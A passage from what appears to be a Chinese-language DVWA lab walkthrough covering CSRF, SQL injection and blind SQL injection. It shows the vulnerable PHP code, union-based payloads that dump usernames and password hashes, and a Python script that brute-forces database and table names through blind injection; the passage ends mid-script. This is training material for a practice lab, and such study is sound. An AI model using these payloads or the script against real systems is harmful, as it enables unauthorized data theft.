class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">            $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn't come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>相关函数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int eregi(string pattern, string string)</span><br><span class="line">检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。</span><br><span class="line">Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名)</span><br></pre></td></tr></table></figure><ul><li>漏洞利用</li></ul><p>过滤规则是<code>http</code>包头的<code>Referer</code>参数的值中必须包含主机名，<code>html</code>攻击文件命名为，<code>主机名.html</code></p><h3 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a><em>High</em>级别</h3><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match? </span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        <span class="comment">// They do! </span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database </span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码加入了<code>Anti-CSRF token</code>机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><p>利用参考：<a href="https://www.freebuf.com/articles/web/118352.html" rel="external nofollow" target="_blank">CSRF</a></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a><strong>基础知识</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.information_schema.tables：存储着MySql中的所有表。</span><br><span class="line">2.information_schema.columns：存储着MySql中的所有列。</span><br><span class="line">3.table_schema是数据库的名称。</span><br><span class="line">4.table_name是具体的表名。</span><br><span class="line">5.table_type指的是表的类型。</span><br><span class="line">6.group_concat(0x3e，xxx):连接多个字段成一个字段。</span><br><span class="line">7.union操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。多个 SELECT 语句会删除重复的数据。</span><br><span class="line">8.information_schema：信息数据库，保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表名，表列的数据类型与访问权限等。</span><br><span class="line">9.mysql_real_escape_string()：实现转义7种危险字符。SQL 语句字符串中的特殊字符，如输入单引号’则处理时会在其前面加上右斜杠\来进行转义，如果语句错误则输出相应的错误信息。其中受影响的字符如下：\x00  \n  \r  \  &apos;  &quot;  \x1a</span><br></pre></td></tr></table></figure><h3 id="low级别-4"><a href="#low级别-4" class="headerlink" title="low级别"></a>low级别</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_REQUEST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = mysql_numrows( $result );</span><br><span class="line">    $i   = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> );</span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count</span></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>漏洞利用</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sql语句</span><br><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;</span><br><span class="line">payload:</span><br><span class="line">1&apos; order by 2# 两列</span><br><span class="line">1&apos; or &apos;1&apos;=&apos;1&apos;# </span><br><span class="line">1%27+union+select+1,group_concat(schema_name) from information_schema.schemata limit 1,1%23&amp;Submit=Submit#  所有数据库</span><br><span class="line">1%27+union+select+1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761 limit 1,1 --+&amp;Submit=Submit# dvwa所有表</span><br><span class="line">1%27+union+select+1,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7573657273%20limit%201,1%20--+&amp;Submit=Submit# users所有列</span><br><span class="line">1%27+union+select+1,group_concat(concat_ws(%27-%27,user_id,first_name,last_name,user,password,avatar,last_login,failed_login)) from dvwa.users limit%201,1%20--+&amp;Submit=Submit# 所有信息</span><br></pre></td></tr></table></figure><h3 id="medium级别-5"><a href="#medium级别-5" class="headerlink" title="medium级别"></a>medium级别</h3><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ];</span><br><span class="line">    $id = mysql_real_escape_string( $id );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = mysql_numrows( $result );</span><br><span class="line">    $i   = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> );</span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count</span></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>漏洞利用</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查询语句</span><br><span class="line">SELECT first_name, last_name FROM users WHERE user_id = $id;</span><br><span class="line">1 or 1=1</span><br><span class="line">post提交，输入参数存在简单的转义。</span><br><span class="line">用户输入部分使用mysql_real_escape_string()函数转义（‘,“,\r,\n,NULL等）</span><br><span class="line">转义仅针对7个字符，如果注入语句中不含这些字符则不受影响。且也可用hex编码绕过</span><br><span class="line">id=1 union select 1,group_concat(concat_ws(0x7e,user,password)) from dvwa.users limit 1,1&amp;Submit=Submit</span><br></pre></td></tr></table></figure><h3 id="high级别-4"><a href="#high级别-4" class="headerlink" title="high级别"></a>high级别</h3><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">'id'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_SESSION[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = mysql_numrows( $result );</span><br><span class="line">    $i   = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> );</span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count</span></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>漏洞利用</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查询语句</span><br><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;</span><br><span class="line"></span><br><span class="line">http://xxx/vulnerabilities/sqli/session-input.php</span><br><span class="line">post数据</span><br><span class="line">id=1&apos; union select 1,group_concat(concat_ws(0x7e,user,password)) from dvwa.users limit 1,1 #&amp;Submit=Submit</span><br><span class="line">访问查看结果http://xxx/vulnerabilities/sqli/</span><br><span class="line"></span><br><span class="line">其他</span><br><span class="line">1&apos; or 1=1#</span><br><span class="line">1&apos; and 1=2 union select database(),2#</span><br></pre></td></tr></table></figure><p>参考文章：<a href="https://blog.csdn.net/ai_64/article/details/93379581" rel="external nofollow" target="_blank">DVWA使用教程（SQL injection）</a></p><ul><li>数字型注入与字符型区别</li></ul><p>当输入的内容为数字时，可能存在数字型注入，也可能存在字符型注入。区别在于，数字型不需要单引号来闭合，而字符型需要通过<strong>单引号</strong>来闭合的。<br>详细理解请参考博客:<a href="https://www.cnblogs.com/zztac/p/11355622.html" rel="external nofollow" target="_blank">如何判断是字符型注入还是数字型注入</a></p><h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><h3 id="low级别-5"><a href="#low级别-5" class="headerlink" title="low级别"></a>low级别</h3><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysql_query( $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysql_numrows( $result ); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>Low级别基于布尔的盲注思路</li></ul><p>1.判断是否存在注入，注入是字符型还是数字型</p><p>2.猜解当前数据库名</p><p>3.猜解数据库中的表名</p><p>4.猜解表中的字段名</p><p>5.猜解数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">二分法猜解</span><br><span class="line">数据库名</span><br><span class="line">1' and length(database())&gt;5 #    -- 显示不存在；说明库名长度&lt;=5</span><br><span class="line">1' and ascii(substr(database(),1,1))&gt;97#  -- 显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）</span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">1' and (<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())&gt;<span class="number">5</span><span class="comment">#  -- # 显示不存在,说明表个数在1-5之间</span></span><br><span class="line"><span class="number">1</span><span class="string">' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))&gt;5 #   -- 显示存在,说明表名长度&gt;5</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span> <span class="comment">#   -- 显示存在&gt;97</span></span><br><span class="line"></span><br><span class="line">字段名</span><br><span class="line"><span class="number">1</span><span class="string">' and (select count(column_name) from information_schema.columns where table_name= '</span><span class="keyword">users</span><span class="string">')&gt;5 #  -- 显示存在  字段数量&gt;5</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> <span class="keyword">length</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= <span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))&gt;<span class="number">5</span> <span class="comment"># 显示存在  字段名长度&gt;5</span></span><br><span class="line"></span><br><span class="line">采用二分法猜测字段名，<span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>确定的是表的第几个字段，<span class="keyword">substr</span>(<span class="keyword">sql</span>,<span class="number">1</span>)确定的是字段的第几个字母开始截取，<span class="keyword">ascii</span>读出左侧的第一个字母的<span class="keyword">ascii</span>值</span><br><span class="line"><span class="number">1</span><span class="string">' and ascii(substr((select column_name from information_schema.columns where table_name= '</span><span class="keyword">users</span><span class="string">' limit 0,1),1))&gt;97 #  -- 判断第一个字段第一个字母是否大于97</span></span><br></pre></td></tr></table></figure><p>穷举法爆破</p><ul><li>表名</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">header = &#123;<span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=n580kqns8kkr29ov6e2hho0hd6; security=low'</span>&#125;</span><br><span class="line">url = <span class="string">'http://192.168.1.113/vulnerabilities/sqli_blind/?id='</span></span><br><span class="line">startStr = <span class="string">"1'and "</span></span><br><span class="line">endStr = <span class="string">" --+&amp;Submit=Submit#"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#参数名</span></span><br><span class="line"><span class="comment">#dblen 数据库长度</span></span><br><span class="line"><span class="comment">#ascii 可视化字符32-126 for j in range(32,127):</span></span><br><span class="line"><span class="comment">#database_name 数据库名</span></span><br><span class="line"><span class="comment">#tableNum      表的数量</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#存在标志</span></span><br><span class="line">flag = <span class="string">'User ID exists in the database.'</span></span><br><span class="line"><span class="comment"># 1.先爆破库名的长度</span></span><br><span class="line">payload = <span class="string">"length(database())="</span> <span class="comment">#查询语句</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    getPayload = startStr + payload +str(i)+endStr</span><br><span class="line">    tempurl = url + getPayload</span><br><span class="line">    content = requests.get(tempurl,headers=header).text </span><br><span class="line">    <span class="keyword">if</span> flag <span class="keyword">in</span> content:</span><br><span class="line">        dblen = i</span><br><span class="line">        print(<span class="string">'数据库名长度为：'</span>+str(dblen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 2.数据库名</span></span><br><span class="line">database_name = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,dblen+<span class="number">1</span>):</span><br><span class="line">    payload = <span class="string">"ascii(substr(database(),"</span>+str(i)+<span class="string">",1))="</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            getPayload = startStr + payload +str(j)+endStr</span><br><span class="line">            tempurl = url + getPayload</span><br><span class="line">            content = requests.get(tempurl,headers=header).text </span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> content:</span><br><span class="line">                <span class="comment">#print(tempurl)</span></span><br><span class="line">                database_name += chr(j)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">print(<span class="string">'当前数据库名：'</span>+database_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆破表的个数</span></span><br><span class="line">payload = <span class="string">"(select count(table_name) from information_schema.tables where table_schema=database())="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    getPayload = startStr + payload +str(i)+endStr</span><br><span class="line">    tempurl = url + getPayload</span><br><span class="line">    content = requests.get(tempurl,headers=header).text </span><br><span class="line">    <span class="comment">#print(tempurl)</span></span><br><span class="line">    <span class="keyword">if</span> flag <span class="keyword">in</span> content:</span><br><span class="line">        tableNum = i</span><br><span class="line">        print(database_name+<span class="string">'数据库有'</span>+str(tableNum)+<span class="string">"个表"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 4.表名</span></span><br><span class="line"><span class="comment"># 表长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,tableNum):</span><br><span class="line">    table_name = <span class="string">''</span></span><br><span class="line">    payload = <span class="string">"length(substr((select table_name from information_schema.tables where table_schema=database() limit "</span>+str(i)+<span class="string">",1),1))="</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span 